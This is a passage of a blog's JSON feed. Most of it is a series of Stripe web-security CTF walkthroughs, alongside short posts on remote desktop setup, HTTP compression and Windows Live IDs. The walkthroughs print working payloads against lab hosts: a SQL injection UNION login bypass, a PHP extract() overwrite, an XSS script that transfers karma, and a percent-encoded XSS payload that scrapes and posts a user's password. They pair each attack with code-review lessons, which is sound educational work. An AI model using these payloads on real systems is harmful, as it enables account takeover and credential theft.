			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  To setup my home Windows dev box to be accessible from outside I followed two main steps:<br><ul><li> Configure <a href=\"http://windows.microsoft.com/en-US/windows7/allow-remote-desktop-connections-from-outside-your-home-network\">my router to forward the remote desktop port.</a></li><li> Setup a <a href=\"http://www.dnsdynamic.org/\">free dynamic DNS service.</a></li></ul>Last time I had to do this there was a service named dynamicdns.org which seems to still exist but no longer appears to be free. Instead I used dnsdynamic.org which is free and has a web API\n  as well as links to and instructions for setting up native tools to dynamically update my IP address.\n</div></div>\n",
			"date_published": "2012-12-07T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-12/Stripe+CTF+-+Level+8/",
			"url": "https://deletethis.net/dave/2012-12/Stripe+CTF+-+Level+8/",
			"title": "Stripe CTF - Level 8",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><a href=\"https://stripe-ctf.com/levels/8\">Level 8</a> of the Stripe CTF is a password server that returns success: true if and only if the password provided matches the password stored directly via\n  a RESTful API and optionally indirectly via a callback URI. The solution is side channel attack like a timing attack but with ports instead of time.<br><br>\n  (I found this in my drafts folder and had intended to post a while ago.)<br><h4>\n    Code\n  </h4><pre><code>    def nextServerCallback(self, data):<br>        parsed_data = json.loads(data)<br>        # Chunk was wrong!<br>        if not parsed_data['success']:<br>            # Defend against timing attacks<br>            remaining_time = self.expectedRemainingTime()<br>            self.log_info('Going to wait %s seconds before responding' %<br>                          remaining_time)<br>            reactor.callLater(remaining_time, self.sendResult, False)<br>            return<br><br>        self.checkNext()</code></pre><br><h4>\n    Issue\n  </h4>The password server breaks the target password into four pieces and stores each on a different server. When a password request is sent to the main server it makes requests to the sub-servers\n  for each part of the password request. It does this in series and if any part fails, then it stops midway through. Password requests may also be made with corresponding URI callbacks and after the\n  server decides on the password makes an HTTP request on the provided URI callbacks saying if the password was success: true or false.<br>\n  A timing attack looks at how long it took for a password to be rejected and longer times could mean a longer prefix of the password was correct allowing for a directed brute force attack. Timing\n  attacks are prevented in this case by code on the password server that attempts to wait the same amount of time, even if the first sub-server responds with false. However, the server uses\n  sequential outgoing port numbers shared between the requests to the sub-servers and the callback URIs. Accordingly, we can examine the port numbers on our callback URIs to direct a brute force\n  attack.<br>\n  If the password provided is totally incorrect then the password server will contact one sub-server and then your callback URI. So if you see the remote server's port number go up by two when\n  requesting your callback URI, you know the password is totally incorrect. If by three then you know the first fourth of the password is correct and the rest is incorrect. If by four then two\n  fourths of the password is correct. If by five then four sub-servers were contacted so you need to rely on the actual content of the callback URI request of 'success: true' or 'false' since you\n  can't tell from the port change if the password was totally correct or not.<br>\n  The trick in the real world is false positives. The port numbers are sequential over the system, so if the password server is the only thing making outgoing requests then its port numbers will also\n  be sequential, however other things on the system can interrupt this. This means that the password server could contact three sub-servers and normally you'd see the port number increase by four,\n  but really it could increase by four or more because of other things running on the system. To counteract this I ran in cycles: brute forcing the first fourth of the password and removing any entry\n  that gets a two port increase and keeping all others. Eventually I could remove all but the correct first fourth of the password. And so on for the next parts of the password.<br>\n  I wrote my app to brute force this in Python. This was my first time writing Python code so it is not pretty.<br></div></div>\n",
			"date_published": "2012-12-07T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+Level+7/",
			"url": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+Level+7/",
			"title": "Stripe CTF - Level 7",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"></div>\n",
			"date_published": "2012-09-13T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+Level+5/",
			"url": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+Level+5/",
			"title": "Stripe CTF - Level 5",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><a href=\"https://stripe-ctf.com/levels/5\">Level 5</a> of the Stripe CTF revolved around a design issue in an OpenID like protocol.\n  </p><h4>\n    Code\n  </h4><pre><code>    def authenticated?(body)<br>      body =~ /[^\\w]AUTHENTICATED[^\\w]*$/<br>    end<br><br>...<br><br>      if authenticated?(body)<br>        session[:auth_user] = username<br>        session[:auth_host] = host<br>        return \"Remote server responded with: #{body}.\" \\<br>               \" Authenticated as #{username}@#{host}!\"</code></pre><h4>\n    Issue\n  </h4><p>\n    This level is an implementation of a federated identity protocol. You give it an endpoint URI and a username and password, it posts the username and password to the endpoint URI, and if the\n    response is 'AUTHENTICATED' then access is allowed. It is easy to be authenticated on a server you control, but this level requires you to authenticate from the server running the level. This\n    level only talks to stripe CTF servers so the first step is to upload a document to the <a href=\"http://deletethis.net/dave/?uri=http%3A%2F%2Fdavescoolblog.blogspot.com%2F2012%2F09%2Fstripe-ctf-input-validation-levels-1-2.html\">level 2</a> server containing the text 'AUTHENTICATED' and we\n    can now authenticate on a level 2 server. Notice that the level 5 server will dump out the content of the endpoint URI and that the regexp it uses to detect the text 'AUTHENTICATED' can match on\n    that dump. Accordingly I uploaded an authenticated file to\n  </p><pre><code>https://level02-2.stripe-ctf.com/user-ajvivlehdt/uploads/authenticated</code></pre>Using that as my endpoint URI means authenticating as level 2. I can then choose the following endpoint\n  URI to authenticate as level 5.\n  <pre><code>https://level05-1.stripe-ctf.com/user-qtoyekwrod/?pingback=https%3A%2F%2Flevel02-2.stripe-ctf.com%2Fuser-ajvivlehdt%2Fuploads%2Fauthenticated&amp;username=a&amp;password=a</code></pre>Navigating\n  to that URI results in the level 5 server telling me I'm authenticated as level 2 and lists the text of the level 2 file 'AUTHENTICATED'. Feeding this back into the level 5 server as my endpoint\n  URI means level 5 seeing 'AUTHENTICATED' coming back from a level 5 URI.\n  <h4>\n    Notes\n  </h4><p>\n    I didn't see any particular code review red flags, really the issue here is that the regular expression testing for 'AUTHENTICATED' is too permisive and the protocol itself doesn't do enough. The\n    protocol requires only a set piece of common literal text to be returned which makes it easy for a server to accidentally fall into authenticating. Having the endpoint URI have to return variable\n    text based on the input would make it much harder for a server to accidentally authenticate.\n  </p></div></div>\n",
			"date_published": "2012-09-11T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+XSS-+CSRF+-Levels+4+-+6-/",
			"url": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+XSS-+CSRF+-Levels+4+-+6-/",
			"title": "Stripe CTF - XSS, CSRF (Levels 4 &amp; 6)",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><a href=\"https://stripe-ctf.com/levels/4\">Level 4</a> and <a href=\"https://stripe-ctf.com/levels/6\">level 6</a> of the Stripe CTF had solutions around XSS.\n  </p><h3>\n    Level 4\n  </h3><h4>\n    Code\n  </h4><pre><code>&gt; Registered Users <br></code></pre><ul><br>\n    &lt;%@registered_users.each do |user| %&gt;<br>\n    &lt;%last_active = user[:last_active].strftime(&amp;apos;%H:%M:%S UTC&amp;apos;) %&gt;<br>\n    &lt;%if @trusts_me.include?(user[:username]) %&gt;<br><li><code><br>\n      &lt;%= user[:username] %&gt;<br>\n      (password: &lt;%= user[:password] %&gt;, last active &lt;%= last_active %&gt;)<br></code></li><h4>\n      Issue\n    </h4><p>\n      The level 4 web application lets you transfer karma to another user and in doing so you are also forced to expose your password to that user. The main user page displays a list of users who\n      have transfered karma to you along with their password. The password is not HTML encoded so we can inject HTML into that user's browser. For instance, we could create an account with the\n      following HTML as the password which will result in XSS with that HTML:\n    </p><pre><code><script><![CDATA[\njQuery.post(\"https://level04-2.stripe-ctf.com/user-kxyiuircqs/transfer\", {\"to\": \"l\", \"amount\": 1});\n]]></script></code></pre>This HTML runs script that uses jQuery to post to the transfer URI resulting in a transfer of karma from the attacked user to the attacker user, and also the attacked user's\npassword.\n    <h4>\n      Notes\n    </h4><p>\n      Code review red flags in this case included lack of encoding when using user controlled content to create HTML content, storing passwords in plain text in the database, and displaying passwords\n      generally. By design the web app shows users passwords which is a very bad idea.\n    </p><h3>\n      Level 6\n    </h3><h4>\n      Code\n    </h4><pre><code><script><![CDATA[\n <br />    var username = \"<%= @username %>\"; <br />    var post_data = <%= @posts.to_json %>; <br /><br />    function escapeHTML(val) { <br />       return $(&amp;apos;<div/>&amp;apos;).text(val).html();<br />    } <br /><br />    function addPost(item) {<br />       var new_element = &amp;apos;<tr><th>&amp;apos; + escapeHTML(item[&amp;apos;user&amp;apos;]) + <br />          &amp;apos;</th><td><h4>&amp;apos; + escapeHTML(item[&amp;apos;title&amp;apos;]) + &amp;apos;</h4>&amp;apos; + <br />          escapeHTML(item[&amp;apos;body&amp;apos;]) + &amp;apos;</td></tr>&amp;apos;; $(&amp;apos;#posts > tbody:last&amp;apos;).prepend(new_element); <br />    } <br />    <br />    for(var i = 0; i < post_data.length; i++) { <br />       var item = post_data[i]; <br />       addPost(item); <br />    }; <br />\n]]></script><br><br>...<br><br>    def self.safe_insert(table, key_values)<br>      key_values.each do |key, value|<br>        # Just in case people try to exfiltrate<br>        # level07-password-holder's password<br>        if value.kind_of?(String) &amp;&amp;<br>            (value.include?('\"') || value.include?(\"'\"))<br>          raise \"Value has unsafe characters\"<br>        end<br>      end<br><br>      conn[table].insert(key_values)<br>    end</code></pre><h4>\n      Issue\n    </h4><p>\n      This web app does a much better job than the level 4 app with HTML injection. They use encoding whenever creating HTML using user controlled data, however they don't use encoding when injecting\n      JSON data into script (see post_data initialization above). This JSON data is the last five most recent messages sent on the app so we get to inject script directly. However, the system also\n      ensures that no strings we write contains single or double quotes so we can't get out of the string in the JSON data directly. As it turns out, HTML lets you jump out of a script block using no\n      matter where you are in script. For instance, in the middle of a value in some JSON data we can jump out of script. But we still want to run script, so we can jump right back in. So the frame\n      so far for the message we're going to post is the following:\n    </p><pre><script><![CDATA[\n our new code goes here \n]]></script><script><![CDATA[\nvar post_data = [];//</pre></code>Because we can't use quotes, actually running script takes some creativity.  I decided to percent-encode my script so quotes don't show up directly, represent this as a regular expression literal so I don't have to use quotes and to eval this script after decoding. There's likely plenty of other ways to get around lack of quotes.<code><pre>var code = /percent-encoded script here/.toString();<br />eval(decodeURIComponent(code.substring(1, code.length - 1))); </pre></code>Then the script I actually encode gets the password from the user-info page (which includes password), regexes the password out, and posts it as a message:<code><pre>jQuery.get(\"https://level06-2.stripe-ctf.com/user-nhboioztch/user_info\").then(function(body) {<br />var password = /Password:<\\/th>[^>]*>([^<]*)/.exec(body)[1];<br />var encPassword = \"\";<br />for (var idx = 0; idx < password.length; ++idx) {<br /> encPassword += \"%\";<br /> encPassword += password.charCodeAt(idx).toString(16);<br />}<br /><br />$(\"#content\").val(encPassword);<br />$(\"#title\").val(\"password\");<br />document.getElementsByTagName(\"form\")[0].submit();<br />});<br /></pre></code>Of course since messages can't include quotes, I have to encode the password before posting it as a message.</p><p>Altogether now here's my message:<code><pre>\n]]></script><script><![CDATA[\nvar code = /%6A%51%75%65%72%79%2E%67%65%74%28%22%68%74%74%70%73%3A%2F%2F%6C%65%76%65%6C%30%36%2D%32%2E%73%74%72%69%70%65%2D%63%74%66%2E%63%6F%6D%2F%75%73%65%72%2D%6E%68%62%6F%69%6F%7A%74%63%68%2F%75%73%65%72%5F%69%6E%66%6F%22%29%2E%74%68%65%6E%28%66%75%6E%63%74%69%6F%6E%28%62%6F%64%79%29%20%7B%0A%76%61%72%20%70%61%73%73%77%6F%72%64%20%3D%20%2F%50%61%73%73%77%6F%72%64%3A%3C%5C%2F%74%68%3E%5B%5E%3E%5D%2A%3E%28%5B%5E%3C%5D%2A%29%2F%2E%65%78%65%63%28%62%6F%64%79%29%5B%31%5D%3B%0A%76%61%72%20%65%6E%63%50%61%73%73%77%6F%72%64%20%3D%20%22%22%3B%0A%66%6F%72%20%28%76%61%72%20%69%64%78%20%3D%20%30%3B%20%69%64%78%20%3C%20%70%61%73%73%77%6F%72%64%2E%6C%65%6E%67%74%68%3B%20%2B%2B%69%64%78%29%20%7B%0A%09%65%6E%63%50%61%73%73%77%6F%72%64%20%2B%3D%20%22%25%22%3B%0A%09%65%6E%63%50%61%73%73%77%6F%72%64%20%2B%3D%20%70%61%73%73%77%6F%72%64%2E%63%68%61%72%43%6F%64%65%41%74%28%69%64%78%29%2E%74%6F%53%74%72%69%6E%67%28%31%36%29%3B%0A%7D%0A%0A%24%28%22%23%63%6F%6E%74%65%6E%74%22%29%2E%76%61%6C%28%65%6E%63%50%61%73%73%77%6F%72%64%29%3B%0A%24%28%22%23%74%69%74%6C%65%22%29%2E%76%61%6C%28%22%70%61%73%73%77%6F%72%64%22%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%22%66%6F%72%6D%22%29%5B%30%5D%2E%73%75%62%6D%69%74%28%29%3B%0A%7D%29%3B/.toString(); eval(decodeURIComponent(code.substring(1, code.length - 1))); \n]]></script><script><![CDATA[\nvar post_data= [];//</pre></code></p><h4>Notes</h4><p>Code review red flags included storing the password in plain text, displaying the password in an HTML page, lack of encoding when generating script on the server side, and a deny list of dangerous characters (quotes). Generally folks should use allow lists not deny lists.  You'll always forget something from your deny list or the platform will change out from under you adding new dangerous entries you didn't consider in your deny list.  In this case an allow list probably also doesn't make as much sense as encoding correctly. The first issue I ran into, was when posting the password I forgot to encode and the password did contain quotes. The second issue I ran into was that my injected script posts a message which results in a page refresh, which results in my injected script running again. This continues five times until my injected script message is pushed off the end. I had to be patient waiting for the target attacked user to login before I would refresh and post my own password.</p></div>\n]]></script></pre></ul></div></div>\n",
			"date_published": "2012-09-10T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+Input+validation+-Levels+1+-+2-/",
			"url": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+Input+validation+-Levels+1+-+2-/",
			"title": "Stripe CTF - Input validation (Levels 1 &amp; 2)",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><a href=\"http://davescoolblog.blogspot.com/2012/08/stripe-web-security-ctf-summary.html\">Stripe's web security CTF</a>'s <a href=\"https://stripe-ctf.com/levels/1\">Level 1</a> and <a href=\"https://stripe-ctf.com/levels/2\">level 2</a> of the Stripe CTF had issues with missing input validation solutions described below.\n  </p><h3>\n    Level 1\n  </h3><h4>\n    Code\n  </h4><pre><code>    &lt;?php<br>      $filename = 'secret-combination.txt';<br>      extract($_GET);<br>      if (isset($attempt)) {<br>        $combination = trim(file_get_contents($filename));<br>        if ($attempt === $combination) {</code></pre><h4>Issue</h4><p>The issue here is the usage of the <a href=\"http://www.php.net/manual/en/function.extract.php\">extract</a> php method which extracts name value pairs from the map input parameter and creates corresponding local variables. However this code uses $_GET which contains a map of name value pairs passed in the query of the URI. The expected behavior is to get an attempt variable out, but since no input validation is done I can provide a filename variable and overwrite the value of $filename. Providing an empty string gives an empty string $combination which I can match with an empty string $attempt. So without knowing the combination I can get past the combination check.</p><h4>Notes</h4><p>Code review red flag in this case was the direct use of $_GET with no validation. Instead of using extract the developer could try to extract specifically the attempt variable manually without using extract.</p><h3>Level 2</h3><h4>Code</h4><code><pre>    $dest_dir = \"uploads/\";<br>    $dest = $dest_dir . basename($_FILES[\"dispic\"][\"name\"]);<br>    $src = $_FILES[\"dispic\"][\"tmp_name\"];<br>    if (move_uploaded_file($src, $dest)) {<br>      $_SESSION[\"dispic_url\"] = $dest;<br>      chmod($dest, 0644);<br>      echo \"<p>Successfully uploaded your display picture.</p>\";<br>    }</pre></code><h4>Issue</h4><p>This code accepts POST uploads of images but with no validation to ensure it is not an arbitrary file. And even though it uses chmod to ensure the file is not executable, things like PHP don't require a file to be executable in order to run them. Accordingly, one can upload a PHP script, then navigate to that script to run it. My PHP script dumped out the contents of the file we're interested in for this level:</p><pre><code></code></pre><h4>\n    Notes\n  </h4><p>\n    Code review red flags include manual file management, chmod, and use of file and filename inputs without any kind of validation. If this code controlled the filename and ensured that the\n    extension was one of a set of image extensions, this would solve this issue. Due to browser mime sniffing its additionally a good idea to serve a content-type that starts with \"image/\" for these\n    uploads to ensure browsers treat these as images and not sniff for script or HTML.\n  </p><p></p></div></div>\n",
			"date_published": "2012-09-06T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+SQL+injections+-Levels+0+-+3-/",
			"url": "https://deletethis.net/dave/2012-09/Stripe+CTF+-+SQL+injections+-Levels+0+-+3-/",
			"title": "Stripe CTF - SQL injections (Levels 0 &amp; 3)",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><a href=\"http://davescoolblog.blogspot.com/2012/08/stripe-web-security-ctf-summary.html\">Stripe's web security CTF</a>'s <a href=\"https://stripe-ctf.com/levels/0\">level 0</a> and <a href=\"https://stripe-ctf.com/levels/3\">level 3</a> had SQL injection solutions described below.\n  </p><h3>\n    Level 0\n  </h3><h4>\n    Code\n  </h4><pre><code>app.get('/*', function(req, res) {<br>  var namespace = req.param('namespace');<br><br>  if (namespace) {<br>    var query = 'SELECT * FROM secrets WHERE key LIKE ? || \".%\"';<br>    db.all(query, namespace, function(err, secrets) {</code></pre><h4>\n    Issue\n  </h4><p>\n    There's no input validation on the namespace parameter and it is injected into the SQL query with no encoding applied. This means you can use the '%' character as the namespace which is the\n    wildcard character matching all secrets.\n  </p><h4>\n    Notes\n  </h4><p>\n    Code review red flag was using strings to query the database. Additional levels made this harder to exploit by using an API with objects to construct a query rather than strings and by running a\n    query that only returned a single row, only ran a single command, and didn't just dump out the results of the query to the caller.\n  </p><h3>\n    Level 3\n  </h3><h4>\n    Code\n  </h4><pre><code>@app.route('/login', methods=['POST'])<br>def login():<br>    username = flask.request.form.get('username')<br>    password = flask.request.form.get('password')<br><br>    if not username:<br>        return \"Must provide username\\n\"<br><br>    if not password:<br>        return \"Must provide password\\n\"<br><br>    conn = sqlite3.connect(os.path.join(data_dir, 'users.db'))<br>    cursor = conn.cursor()<br><br>    query = \"\"\"SELECT id, password_hash, salt FROM users<br>               WHERE username = '{0}' LIMIT 1\"\"\".format(username)<br>    cursor.execute(query)<br><br>    res = cursor.fetchone()<br>    if not res:<br>        return \"There's no such user {0}!\\n\".format(username)<br>    user_id, password_hash, salt = res<br><br>    calculated_hash = hashlib.sha256(password + salt)<br>    if calculated_hash.hexdigest() != password_hash:<br>        return \"That's not the password for {0}!\\n\".format(username)</code></pre><h4>\n    Issue\n  </h4><p>\n    There's little input validation on username before it is used to constrcut a SQL query. There's no encoding applied when constructing the SQL query string which is used to, given a username,\n    produce the hashed password and the associated salt. Accordingly one can make username a part of a SQL query command which ensures the original select returns nothing and provide a new SELECT via\n    a UNION that returns some literal values for the hash and salt. For instance the following in blue is the query template and the red is the username injected SQL code:\n  </p><pre><code><span style=\"color:blue\">SELECT id, password_hash, salt FROM users WHERE username = '</span><span style=\"color:red\">doesntexist' UNION SELECT id, ('5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8') AS password_hash, ('word') AS salt FROM users WHERE username = 'bob</span><span style=\"color:blue;\">' LIMIT 1</span></code></pre>In the above I've supplied my own salt and hash such that my salt (word) plus my password (pass) hashed produce the hash I provided above. Accordingly, by\n  providing the above long and interesting looking username and password as 'pass' I can login as any user.\n  <h4>\n    Notes\n  </h4><p>\n    Code review red flag is again using strings to query the database. Although this level was made more difficult by using an API that returns only a single row and by using the execute method which\n    only runs one command. I was forced to (as a SQL noob) learn <a href=\"http://www.sqlite.org/lang.html\">the syntax of SELECT</a> in order to figure out UNION and how to return my own literal\n    values.\n  </p></div></div>\n",
			"date_published": "2012-09-05T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-08/Stripe+Web+Security+CTF+Summary/",
			"url": "https://deletethis.net/dave/2012-08/Stripe+Web+Security+CTF+Summary/",
			"title": "Stripe Web Security CTF Summary",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I was the <a href=\"https://stripe-ctf.com/leaderboard/27\">546th person</a> to complete Stripe's web security CTF and again had a ton of fun applying my theoretical knowledge of web security\n    issues to the (semi-)real world. As I went through the levels I thought about what red flags jumped out at me (or should have) that I could apply to future code reviews:\n  </p><table><tr><th>\n        Level\n      </th><th>\n        Issue\n      </th><th>\n        Code Review Red Flags\n      </th></tr><tr><td>\n        0\n      </td><td>\n        Simple SQL injection\n      </td><td>\n        No encoding when constructing SQL command strings. Constructing SQL command strings instead of SQL API\n      </td></tr><tr><td>\n        1\n      </td><td>\n        extract($_GET);\n      </td><td>\n        No input validation.\n      </td></tr><tr><td>\n        2\n      </td><td>\n        Arbitrary PHP execution\n      </td><td>\n        No input validation. Allow file uploads. File permissions modification.\n      </td></tr><tr><td>\n        3\n      </td><td>\n        Advanced SQL injection\n      </td><td>\n        Constructing SQL command strings instead of SQL API.\n      </td></tr><tr><td>\n        4\n      </td><td>\n        HTML injection, XSS and CSRF\n      </td><td>\n        No encoding when constructing HTML. No CSRF counter measures. Passwords stored in plain text. Password displayed on site.\n      </td></tr><tr><td>\n        5\n      </td><td>\n        Pingback server doesn't need to opt-in\n      </td><td>\n        n/a - By design protocol issue.\n      </td></tr><tr><td>\n        6\n      </td><td>\n        Script injection and XSS\n      </td><td>\n        No encoding while constructing script. Deny list (of dangerous characters). Passwords stored in plain text. Password displayed on site.\n      </td></tr><tr><td>\n        7\n      </td><td>\n        Length extension attack\n      </td><td>\n        Custom crypto code. Constructing SQL command string instead of SQL API.\n      </td></tr><tr><td>\n        8\n      </td><td>\n        Side channel attack\n      </td><td>\n        Password handling code. Timing attack mitigation too clever.\n      </td></tr></table><p>\n    More about each level in the future.\n  </p></div></div>\n",
			"date_published": "2012-08-30T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-08/Web+Security+Contest+-+Stripe+CTF/",
			"url": "https://deletethis.net/dave/2012-08/Web+Security+Contest+-+Stripe+CTF/",
			"title": "Web Security Contest - Stripe CTF",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Stripe is running a <a href=\"https://stripe-ctf.com/about\">web security capture the flag</a> - a series of increasingly difficult web security exploit challenges. <a href=\"https://stripe-ctf.com/progress/SequelGuy\">I've finished it</a> and had a lot of fun. Working on a web browser I knew the theory of these various web based attacks, but this was my first chance\n    to put theory into practice with:\n  </p><ul><li>No adverse consequences\n    </li><li>Knowledge that there is a fun security exploit to find\n    </li><li>Access to the server side source code\n    </li></ul><p>\n    Here's a blog post on the <a href=\"https://blog.gregbrockman.com/2012/08/system-design-stripe-capture-the-flag/\">CTF behind the scenes setup</a> which has many impressive features including\n    phantom users that can be XSS/CSRF'ed.\n  </p><p>\n    I'll have another post on my difficulties and answers for the CTF levels after the contest is over on Wed, but if you're looking for hints, try out the <a href=\"https://answers.stripe.com/chat#ctf\">CTF chatroom</a> or the <a href=\"https://answers.stripe.com/chat#level4\">level specific CTF chatroom</a>.\n  </p></div></div>\n",
			"date_published": "2012-08-27T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-06/HTTP+Compression+Documentation+Reference/",
			"url": "https://deletethis.net/dave/2012-06/HTTP+Compression+Documentation+Reference/",
			"title": "HTTP Compression Documentation Reference",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  There's a lot of name reuse in HTTP compression so I've made the following to help myself keep it straight.\n  <table border=\"1\"><tr><th><a href=\"http://www.iana.org/assignments/http-parameters/http-parameters.xml\">HTTP Content Coding Token</a></th><td><a href=\"http://tools.ietf.org/html/rfc2616.html#section-3.5\">gzip</a></td><td><a href=\"http://tools.ietf.org/html/rfc2616.html#section-3.5\">deflate</a></td><td><a href=\"http://tools.ietf.org/html/rfc2616.html#section-3.5\">compress</a></td></tr><tr><th></th><td>\n        An encoding format produced by the file compression program \"gzip\" (GNU zip)\n      </td><td>\n        The \"zlib\" format as described in RFC 1950.\n      </td><td>\n        The encoding format produced by the common UNIX file compression program \"compress\".\n      </td></tr><tr><th>\n        Data Format\n      </th><td><a href=\"http://tools.ietf.org/html/rfc1952.html\">GZIP file format</a></td><td><a href=\"http://tools.ietf.org/html/rfc1950.html\">ZLIB Compressed Data Format</a></td><td>\n        The <a href=\"http://en.wikipedia.org/wiki/Compress\">compress program's</a> file format\n      </td></tr><tr><th>\n        Compression Method\n      </th><td colspan=\"2\"><a href=\"http://tools.ietf.org/html/rfc1951.html#page-6\">Deflate compression method</a></td><td>\n        LZW\n      </td></tr><tr><th></th><td colspan=\"2\">\n        Deflate consists of <a href=\"http://en.wikipedia.org/wiki/LZ77\">LZ77</a> and <a href=\"http://en.wikipedia.org/wiki/Huffman_coding\">Huffman coding</a></td></tr></table><p>\n    Compress doesn't seem to be supported by popular current browsers, possibly due to its past with patents.\n  </p><p>\n    Deflate isn't done correctly all the time. <a href=\"http://stackoverflow.com/questions/9170338/why-are-major-web-sites-using-gzip/9186091#9186091\">Some servers would send the deflate data\n    format</a> instead of the zlib data format and at least <a href=\"http://stackoverflow.com/a/2541174\">some versions of Internet Explorer expect deflate data format</a> instead of zlib data format.\n  </p></div></div>\n",
			"date_published": "2012-06-13T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-06/Application+Protocols+in+Windows+8/",
			"url": "https://deletethis.net/dave/2012-06/Application+Protocols+in+Windows+8/",
			"title": "Application Protocols in Windows 8",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  In Windows 8 you can still <a href=\"http://msdn.microsoft.com/en-us/library/aa767914(v=VS.85).aspx\">register a desktop application to handle a particular URI scheme</a>, but now you can also\n  <a href=\"http://msdn.microsoft.com/en-us/library/windows/apps/hh452686.aspx\">register a Metro Win8 application to handle a particular URI scheme</a>. No more manually modifying the registry - now\n  there's pretty UI in VS to handle this.\n</div></div>\n",
			"date_published": "2012-06-12T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-06/Changing+Windows+Live+IDs/",
			"url": "https://deletethis.net/dave/2012-06/Changing+Windows+Live+IDs/",
			"title": "Changing Windows Live IDs",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Use of my old Hotmail account has really snuck up on me as I end up caring more and more about all of the services with which it is associated. The last straw is <a href=\"http://blogs.msdn.com/b/b8/archive/2011/09/26/signing-in-to-windows-8-with-a-windows-live-id.aspx\">Windows 8 login</a>, but previous straws include Xbox, Zune, SkyDrive, and my Windows 7 Phone.\n    I like the features and sync'ing associated with the Windows Live ID, but I don't like my old, spam filled, hotmail email address on the Live ID account.\n  </p><p>\n    A coworker told me about <a href=\"http://pablodiaz.pro/?p=11\">creating a Live ID from a custom domain</a>, which sounded like just the ticket for me. Following the instructions above I was able\n    to create a new deletethis.net Live ID but the next step of actually using this new Live ID was much more difficult. My first hope was there would be some way to link my new and old Live IDs so\n    as to make them interchangeable. As it turns out there is a way to <a href=\"http://timheuer.com/blog/archive/2007/10/26/link-your-windows-live-accounts.aspx\">link Live IDs</a> but all that does\n    is make it easy to switch between accounts on Live Mail, SkyDrive and some other webpages.\n  </p><p>\n    Instead one must change over each service or start over depending on the service:\n  </p><dl><dt>\n      Xbox\n    </dt><dd>\n      In the <a href=\"http://support.xbox.com/en-US/billing-and-subscriptions/account-management/manage-live-id#3c34347c60454eff8dd78d8b34be7a6d\">Xbox 360 system menu you can change the Live ID</a>\n      associated with your gamertag. This worked fine for me and I got an email telling me about the transfer of my Microsoft Points.\n    </dd><dt>\n      Zune\n    </dt><dd>\n      There's no way to do this for the Zune specifically, however changing over your Xbox account <a href=\"http://answers.microsoft.com/en-us/zune/forum/account-net/zune-account-associated-with-false-e-mail/0abcf8b5-be0f-47b0-a56f-0bfe1fdc9e9b\">also transfers over all your Zune purchased\n      content</a>. I don't have a Zune Pass so I can't confirm that, but all of my previously purchased television shows transferred over successfully.\n    </dd><dt>\n      Windows 7 Phone\n    </dt><dd>\n      To change the main Live ID associated with your phone, <a href=\"http://support.microsoft.com/kb/2430020\">reset your phone to factory default</a> and start over. All purchased applications are\n      lost. Had I purchased any applications I would have been pissed, but instead I was just irritated that I had to reset my phone.\n    </dd><dt>\n      Mail\n    </dt><dd>\n      I don't use my Hotmail account for anything and it only sits and collects spam. Accordingly I didn't attempt switching this over.\n    </dd><dt>\n      SkyDrive\n    </dt><dd>\n      I didn't have much in my SkyDrive account. I downloaded all files as a zip and then manually uploaded them to the new account.\n    </dd></dl></div></div>\n",
			"date_published": "2012-06-06T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-05/Crowdsource+These+Projects/",
			"url": "https://deletethis.net/dave/2012-05/Crowdsource+These+Projects/",
			"title": "Crowdsource These Projects",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I keep seeing crowdsource projects with big names that I actually want to back:\n  </p><ul><li><a href=\"http://www.pledgemusic.com/projects/benfoldsfive\">New Ben Folds Five album</a></li><li><a href=\"http://www.kickstarter.com/projects/66710809/double-fine-adventure\">New Double Fine Adventure game</a></li><li><a href=\"http://www.kickstarter.com/projects/amandapalmer/amanda-palmer-the-new-record-art-book-and-tour\">New Amanda Palmer album</a></li><li><a href=\"http://www.kickstarter.com/projects/spaceventure/two-guys-spaceventure-by-the-creators-of-space-que\">New Space Quest (like) game</a></li></ul></div></div>\n",
			"date_published": "2012-05-22T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-05/Permanently+Add+Path+to+System+PATH+Environment+Variable+in+PowerShell/",
			"url": "https://deletethis.net/dave/2012-05/Permanently+Add+Path+to+System+PATH+Environment+Variable+in+PowerShell/",
			"title": "Permanently Add Path to System PATH Environment Variable in PowerShell",
